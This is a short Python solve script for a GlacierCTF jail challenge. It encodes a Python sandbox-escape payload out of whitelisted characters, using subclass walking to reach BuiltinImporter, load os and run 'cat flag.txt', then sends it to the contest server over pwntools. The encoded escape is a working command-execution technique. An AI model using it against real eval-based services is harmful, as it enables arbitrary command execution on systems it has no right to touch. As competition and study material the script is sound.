#!/usr/bin/env python3

#KLPP, ruifi47

whitelist = """gctf{"*+*(=>:/)*+*"}"""
def getexpr(i):
	if i==0:
		ans="""("c">"g")"""
		return ans
	if i==1:
		ans="""("g">"c")"""
		return ans
	if i==2:
		ans="("+getexpr(1)+"+"+getexpr(1)+")"
		return ans
	if i%2!=0:
		ans="("+getexpr(1)+"+"+getexpr(i-1)+")"
		return ans
	ans="("+getexpr(2)+"*"+getexpr(i//2)+")"
	return ans

Resp={}
Mxlen=0
for i in range(0,1000):
	res=f"{i:c}"
	expr='f"""{'+getexpr(i)+':c}"""'
	Resp[res]=expr
	Mxlen=max(Mxlen,len(expr))

code='(lambda: [x for x in [].__class__.__base__.__subclasses__() if x.__name__ == \'BuiltinImporter\'][0]().load_module(\'os\').system("cat flag.txt"))()'

def codetoexpr(cd):
	res=""
	for a in cd:
		res+=Resp[a]
		res+="+"
	return res[:-1]

from pwn import *

#r = process("./chall.py")
r = remote("chall.glacierctf.com", 13384)

payload = codetoexpr(code)

r.sendlineafter(b"input: ", payload)
print(r.recvall())
#gctf{But_wh3n_th3_w0rld_n33d3d_h1m_m0st_h3_sp4wn3d_4_sh3ll}
